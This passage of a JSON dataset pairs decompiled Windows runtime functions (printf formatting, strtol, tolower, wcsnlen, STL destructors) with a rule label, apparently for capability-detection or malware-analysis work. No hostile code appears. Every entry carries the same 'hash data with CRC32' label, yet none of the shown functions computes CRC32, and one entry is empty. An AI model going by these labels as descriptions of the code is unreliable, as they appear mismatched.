        "decompiled_code": "\nuint __fastcall fcn.00403b11(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404bb5(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.00405911();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "00403b16": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403b16(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.00403030();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x41) {\n            return arg_8h;\n        }\n        if (0x5a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h + 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.004015c3(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x00462f39:\n            iVar2 = fcn.00404d04();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x00462f22;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 1) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x00462f39;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x00462f22:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00402b53(iVar1, 0x100, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 687
    },
    "00460216": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460216(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "00403c2e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403c2e(uint arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t uVar9;\n    uint32_t arg_8h_00;\n    uint32_t uVar10;\n    int32_t var_a0h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    cVar2 = fcn.004025db();\n    if (cVar2 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004057e5(arg_8h);\n            var_4h = 0;\n            do {\n                puVar4 = arg_ch;\n                uVar9 = *puVar4;\n                arg_8h_00 = uVar9;\n                puVar8 = puVar4 + 1;\n                iVar5 = fcn.0040211c(arg_8h_00, 8);\n                arg_ch = puVar8;\n            } while (iVar5 != 0);\n            arg_18h = arg_18h & 0xff;\n            if (uVar9 == 0x2d) {\n                arg_18h = arg_18h | 2;\ncode_r0x004bea4c:\n                arg_8h_00 = *puVar8;\n                puVar8 = puVar4 + 2;\n            }\n            else if (uVar9 == 0x2b) goto code_r0x004bea4c;\n            var_8h = 0x660;\n            arg_ch = puVar8;\n            if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x004bed56;\n            uVar9 = arg_8h_00;\n            if (uVar9 < 0x30) {\ncode_r0x004bece1:\n                if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                    iVar5 = -1;\n                }\n                else {\n                    uVar6 = arg_8h_00;\n                    if (arg_8h_00 - 0x61 < 0x1a) {\n                        uVar6 = arg_8h_00 - 0x20;\n                    }\n                    iVar5 = uVar6 - 0x37;\n                }\n            }\n            else {\n                iVar5 = 0x30;\n                if (uVar9 < 0x3a) {\ncode_r0x004beb7b:\n                    iVar5 = arg_8h_00 - iVar5;\n                }\n                else {\n                    if (uVar9 < 0xff10) {\n                        if ((uVar9 < 0x660) ||\n                           ((iVar5 = var_8h,  0x669 < uVar9 &&\n                            ((iVar5 = 0x6f0,  uVar9 < 0x6f0 ||\n                             ((0x6f9 < uVar9 &&\n                              ((iVar5 = 0x966,  uVar9 < 0x966 ||\n                               ((0x96f < uVar9 &&\n                                ((iVar5 = 0x9e6,  uVar9 < 0x9e6 ||\n                                 ((0x9ef < uVar9 &&\n                                  ((iVar5 = 0xa66,  uVar9 < 0xa66 ||\n                                   ((0xa6f < uVar9 &&\n                                    ((iVar5 = 0xae6,  uVar9 < 0xae6 ||\n                                     ((0xaef < uVar9 &&\n                                      ((iVar5 = 0xb66,  uVar9 < 0xb66 ||\n                                       ((0xb6f < uVar9 &&\n                                        ((iVar5 = 0xc66,  uVar9 < 0xc66 ||\n                                         ((0xc6f < uVar9 &&\n                                          ((iVar5 = 0xce6,  uVar9 < 0xce6 ||\n                                           ((0xcef < uVar9 &&\n                                            ((iVar5 = 0xd66,  uVar9 < 0xd66 ||\n                                             ((0xd6f < uVar9 &&\n                                              ((iVar5 = 0xe50,  uVar9 < 0xe50 ||\n                                               ((0xe59 < uVar9 &&\n                                                ((iVar5 = 0xed0,  uVar9 < 0xed0 ||\n                                                 ((0xed9 < uVar9 &&\n                                                  ((iVar5 = 0xf20,  uVar9 < 0xf20 ||\n                                                   ((0xf29 < uVar9 &&\n                                                    ((iVar5 = 0x1040,  uVar9 < 0x1040 ||\n                                                     ((0x1049 < uVar9 &&\n                                                      ((iVar5 = 0x17e0,  uVar9 < 0x17e0 ||\n                                                       ((0x17e9 < uVar9 &&\n                                                        ((iVar5 = 0x1810,  uVar9 < 0x1810 || (0x1819 < uVar9))))))))))))\n                                                   ))))))))))))))))))))))))))))))))))))))))))))))))))\n                        goto code_r0x004bece1;\n                        goto code_r0x004beb7b;\n                    }\n                    if (uVar9 < 0xff1a) {\n                        iVar5 = arg_8h_00 - 0xff10;\n                    }\n                    else {\n                        iVar5 = -1;\n                    }\n                }\n                if (iVar5 == -1) goto code_r0x004bece1;\n            }\n            if (iVar5 == 0) {\n                uVar6 = *puVar8;\n                arg_ch = puVar8 + 1;\n                if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n                    if (arg_14h == 0) {\n                        arg_14h = 0x10;\n                    }\n                    arg_8h_00 = *arg_ch;\n                    arg_ch = puVar8 + 2;\n                }\n                else {\n                    if (arg_14h == 0) {\n                        arg_14h = 8;\n                    }\n                    fcn.00402ecd(uVar6);\n                }\n            }\n            else if (arg_14h == 0) {\n                arg_14h = 10;\n            }\ncode_r0x004bed56:\n            uVar6 = 0xffffffff / arg_14h;\n            do {\n                uVar9 = arg_8h_00;\n                if (uVar9 < 0x30) {\ncode_r0x004beed8:\n                    if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                        uVar7 = 0xffffffff;\n                    }\n                    else {\n                        uVar7 = arg_8h_00;\n                        if (arg_8h_00 - 0x61 < 0x1a) {\n                            uVar7 = arg_8h_00 - 0x20;\n                        }\n                        uVar7 = uVar7 - 0x37;\n                    }\n                }\n                else {\n                    iVar5 = 0x30;\n                    if (uVar9 < 0x3a) {\ncode_r0x004bed73:\n                        uVar7 = arg_8h_00 - iVar5;\n                    }\n                    else {\n                        iVar5 = 0xff10;\n                        if (uVar9 < 0xff10) {\n                            if ((uVar9 < 0x660) ||\n                               ((iVar5 = var_8h,  0x669 < uVar9 &&\n                                ((iVar5 = 0x6f0,  uVar9 < 0x6f0 ||\n                                 ((0x6f9 < uVar9 &&\n                                  ((iVar5 = 0x966,  uVar9 < 0x966 ||\n                                   ((0x96f < uVar9 &&\n                                    ((iVar5 = 0x9e6,  uVar9 < 0x9e6 ||\n                                     ((0x9ef < uVar9 &&\n                                      ((iVar5 = 0xa66,  uVar9 < 0xa66 ||\n                                       ((0xa6f < uVar9 &&\n                                        ((iVar5 = 0xae6,  uVar9 < 0xae6 ||\n                                         ((0xaef < uVar9 &&\n                                          ((iVar5 = 0xb66,  uVar9 < 0xb66 ||\n                                           ((0xb6f < uVar9 &&\n                                            ((iVar5 = 0xc66,  uVar9 < 0xc66 ||\n                                             ((0xc6f < uVar9 &&\n                                              ((iVar5 = 0xce6,  uVar9 < 0xce6 ||\n                                               ((0xcef < uVar9 &&\n                                                ((iVar5 = 0xd66,  uVar9 < 0xd66 ||\n                                                 ((0xd6f < uVar9 &&\n                                                  ((iVar5 = 0xe50,  uVar9 < 0xe50 ||\n                                                   ((0xe59 < uVar9 &&\n                                                    ((iVar5 = 0xed0,  uVar9 < 0xed0 ||\n                                                     ((0xed9 < uVar9 &&\n                                                      ((iVar5 = 0xf20,  uVar9 < 0xf20 ||\n                                                       ((0xf29 < uVar9 &&\n                                                        ((iVar5 = 0x1040,  uVar9 < 0x1040 ||\n                                                         ((0x1049 < uVar9 &&\n                                                          ((iVar5 = 0x17e0,  uVar9 < 0x17e0 ||\n                                                           ((0x17e9 < uVar9 &&\n                                                            ((iVar5 = 0x1810,  uVar9 < 0x1810 || (0x1819 < uVar9))))))))\n                                                         ))))))))))))))))))))))))))))))))))))))))))))))))))))))\n                            goto code_r0x004beed8;\n                            goto code_r0x004bed73;\n                        }\n                        if (uVar9 < 0xff1a) goto code_r0x004bed73;\n                        uVar7 = 0xffffffff;\n                    }\n                    if (uVar7 == 0xffffffff) goto code_r0x004beed8;\n                }\n                if ((uVar7 == 0xffffffff) || (arg_14h <= uVar7)) goto code_r0x004bef3c;\n                if ((var_4h < uVar6) || ((var_4h == uVar6 && (uVar7 <= 0xffffffff % arg_14h)))) {\n                    uVar10 = 8;\n                    var_4h = var_4h * arg_14h + uVar7;\n                }\n                else {\n                    uVar10 = 0xc;\n                }\n                arg_8h_00 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                arg_18h = arg_18h | uVar10;\n            } while( true );\n        }\n        puVar3 = fcn.004039a4();\n        *puVar3 = 0x16;\n        fcn.00403751();\n    }\n    var_4h = 0;\ncode_r0x004be9ec:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return var_4h;\ncode_r0x004bef3c:\n    fcn.00402ecd(arg_8h_00);\n    if ((arg_18h & 8) == 0) {\n        var_4h = 0;\n        arg_ch = puVar1;\n    }\n    else {\n        cVar2 = fcn.00401979(arg_18h, var_4h);\n        if (cVar2 == '\\0') {\n            if ((arg_18h & 2) != 0) {\n                var_4h = -var_4h;\n            }\n        }\n        else {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x22;\n            if ((arg_18h & 1) == 0) {\n                var_4h = 0xffffffff;\n            }\n            else if ((arg_18h & 2) == 0) {\n                var_4h = 0x7fffffff;\n            }\n            else {\n                var_4h = 0x80000000;\n            }\n        }\n    }\n    if (var_94h != '\\0') {\n        *(var_a0h + 0x350) = *(var_a0h + 0x350) & 0xfffffffd;\n    }\n    goto code_r0x004be9ec;\n}\n",
        "token_count": 3170
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "0046bdd2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bdd2(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::time_get_wchar_t__class_std::istreambuf_iterator_wchar_t__struct_std::char_traits_wchar_t___.0\n    ;\n    fcn.00402a27();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00403e13": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e13(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00403760(8, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "00403e18": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403e18(int16_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uchar (*pauVar5) [32];\n    uchar auVar6 [16];\n    uchar auVar7 [32];\n    uchar in_YMM1 [32];\n    int16_t *piVar2;\n    uint16_t uVar8;\n    \n    piVar2 = arg_8h;\n    if (*0x56ec4c < 5) {\n        if (*0x56ec4c < 1) {\n            if (arg_8h != arg_8h + arg_ch) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + arg_ch);\n            }\n            iVar1 = piVar2 - arg_8h;\n            goto code_r0x004be4e1;\n        }\n        if ((arg_8h & 1) == 0) {\n            uVar4 = (-((arg_8h & 0xf) != 0) & 0x10 - (arg_8h & 0xf)) >> 1;\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            if (arg_8h != arg_8h + uVar4) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + uVar4);\n            }\n            uVar3 = piVar2 - arg_8h >> 1;\n            if (uVar3 != uVar4) {\n                return uVar3;\n            }\n            for (piVar2 = arg_8h + uVar3; piVar2 != arg_8h + (arg_ch - uVar4 & 0xfffffff0) + uVar3; piVar2 = piVar2 + 8)\n            {\n                uVar8 = -(piVar2[7] == 0);\n                auVar6 = CONCAT214(uVar8, CONCAT212(-(piVar2[6] == 0), \n                                                    CONCAT210(-(piVar2[5] == 0), \n                                                              CONCAT28(-(piVar2[4] == 0), \n                                                                       CONCAT26(-(piVar2[3] == 0), \n                                                                                CONCAT24(-(piVar2[2] == 0), \n                                                                                         CONCAT22(-(piVar2[1] == 0), \n                                                                                                  -(*piVar2 == 0))))))))\n                ;\n                if ((SUB161(auVar6 >> 7, 0) & 1 | (SUB161(auVar6 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar6 >> 0x17, 0) & 1) << 2 | (SUB161(auVar6 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar6 >> 0x27, 0) & 1) << 4 | (SUB161(auVar6 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar6 >> 0x37, 0) & 1) << 6 | (SUB161(auVar6 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar6 >> 0x47, 0) & 1) << 8 | (SUB161(auVar6 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar6 >> 0x57, 0) & 1) << 10 | (SUB161(auVar6 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar6 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar6 >> 0x6f, 0) & 1) << 0xd |\n                     (uVar8 >> 7 & 1) << 0xe | uVar8 & 0x8000) != 0) break;\n            }\n            for (; (piVar2 != arg_8h + arg_ch && (*piVar2 != 0)); piVar2 = piVar2 + 1) {\n            }\n        }\n        else if (arg_8h != arg_8h + arg_ch) {\n            do {\n                if (*piVar2 == 0) break;\n                piVar2 = piVar2 + 1;\n            } while (piVar2 != arg_8h + arg_ch);\n        }\n    }\n    else {\n        if ((arg_8h & 1) == 0) {\n            uVar4 = (-((arg_8h & 0x1f) != 0) & 0x20 - (arg_8h & 0x1f)) >> 1;\n            if (arg_ch < uVar4) {\n                uVar4 = arg_ch;\n            }\n            if (arg_8h != arg_8h + uVar4) {\n                do {\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                } while (piVar2 != arg_8h + uVar4);\n            }\n            uVar3 = piVar2 - arg_8h >> 1;\n            if (uVar3 != uVar4) {\n                return uVar3;\n            }\n            pauVar5 = arg_8h + uVar3;\n            auVar6 = vpxor_avx(SUB3216(in_YMM1, 0), SUB3216(in_YMM1, 0));\n            while ((pauVar5 != arg_8h + (arg_ch - uVar4 & 0xffffffe0) + uVar3 &&\n                   (auVar7 = vpcmpeqw_avx2(ZEXT1632(auVar6), *pauVar5), \n                   (SUB321(auVar7 >> 7, 0) & 1 | (SUB321(auVar7 >> 0xf, 0) & 1) << 1 |\n                    (SUB321(auVar7 >> 0x17, 0) & 1) << 2 | (SUB321(auVar7 >> 0x1f, 0) & 1) << 3 |\n                    (SUB321(auVar7 >> 0x27, 0) & 1) << 4 | (SUB321(auVar7 >> 0x2f, 0) & 1) << 5 |\n                    (SUB321(auVar7 >> 0x37, 0) & 1) << 6 | (SUB321(auVar7 >> 0x3f, 0) & 1) << 7 |\n                    (SUB321(auVar7 >> 0x47, 0) & 1) << 8 | (SUB321(auVar7 >> 0x4f, 0) & 1) << 9 |\n                    (SUB321(auVar7 >> 0x57, 0) & 1) << 10 | (SUB321(auVar7 >> 0x5f, 0) & 1) << 0xb |\n                    (SUB321(auVar7 >> 0x67, 0) & 1) << 0xc | (SUB321(auVar7 >> 0x6f, 0) & 1) << 0xd |\n                    (SUB321(auVar7 >> 0x77, 0) & 1) << 0xe | SUB321(auVar7 >> 0x7f, 0) << 0xf |\n                    (SUB321(auVar7 >> 0x87, 0) & 1) << 0x10 | (SUB321(auVar7 >> 0x8f, 0) & 1) << 0x11 |\n                    (SUB321(auVar7 >> 0x97, 0) & 1) << 0x12 | (SUB321(auVar7 >> 0x9f, 0) & 1) << 0x13 |\n                    (SUB321(auVar7 >> 0xa7, 0) & 1) << 0x14 | (SUB321(auVar7 >> 0xaf, 0) & 1) << 0x15 |\n                    (SUB321(auVar7 >> 0xb7, 0) & 1) << 0x16 | SUB321(auVar7 >> 0xbf, 0) << 0x17 |\n                    (SUB321(auVar7 >> 199, 0) & 1) << 0x18 | (SUB321(auVar7 >> 0xcf, 0) & 1) << 0x19 |\n                    (SUB321(auVar7 >> 0xd7, 0) & 1) << 0x1a | (SUB321(auVar7 >> 0xdf, 0) & 1) << 0x1b |\n                    (SUB321(auVar7 >> 0xe7, 0) & 1) << 0x1c | (SUB321(auVar7 >> 0xef, 0) & 1) << 0x1d |\n                    (SUB321(auVar7 >> 0xf7, 0) & 1) << 0x1e | SUB321(auVar7 >> 0xff, 0) << 0x1f) == 0))) {\n                pauVar5 = pauVar5[1];\n            }\n            for (; (pauVar5 != arg_8h + arg_ch && (**pauVar5 != 0)); pauVar5 = *pauVar5 + 2) {\n            }\n            vzeroupper_avx();\n            return pauVar5 - arg_8h >> 1;\n        }\n        if (arg_8h != arg_8h + arg_ch) {\n            do {\n                if (*piVar2 == 0) break;\n                piVar2 = piVar2 + 1;\n            } while (piVar2 != arg_8h + arg_ch);\n        }\n    }\n    iVar1 = piVar2 - arg_8h;\ncode_r0x004be4e1:\n    return iVar1 >> 1;\n}\n",
        "token_count": 2363
    },
    "0046014a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046014a(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4e2e3c;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    *in_ECX = vtable.std::ios_base.0;\n    fcn.00406898(in_ECX);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 169
    },
    "00403ed6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ed6(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402739(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00405ee3(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040163b(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040391d(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004029e6(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004033c3(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00406073(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040420f(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405c4f(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.00404278();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.004057e0(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 1;\n        if (var_4h == 8) {\n            fcn.004068e8(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00401262(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != 0x30)))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1023
    },
    "0046ba95": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046ba95(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00404002": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404002(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00405de9();\n    if (cVar2 == '\\0') {\ncode_r0x004a2146:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.004058f8();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x32) == 0x61) || (*(param_1 + 0x32) == 0x41)) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x32) == 0x67 || (iVar6 = 0,  *(param_1 + 0x32) == 0x47)))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404bb5(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.00405911();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00401014(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a2146;\n            uVar4 = fcn.00405911();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x32);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            